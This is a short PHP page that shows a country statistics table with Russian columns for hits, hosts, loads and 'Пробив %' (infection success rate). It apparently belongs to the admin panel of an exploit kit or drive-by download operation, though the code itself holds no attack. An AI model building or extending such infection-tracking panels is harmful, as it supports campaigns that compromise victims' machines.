<?php

include("html_panel_header.php");

function _stat_countries()
{
	GLOBAL $hits_country, $loads_country, $hosts_country;
	_load_vars();
	_make_stat3('статистика по странах',array('Страна','Хиты','Хосты','Загрузки','Пробив %'),@$hits_country,@$loads_country,@$hosts_country);
}

_stat_countries();

include("html_panel_footer.php");

?>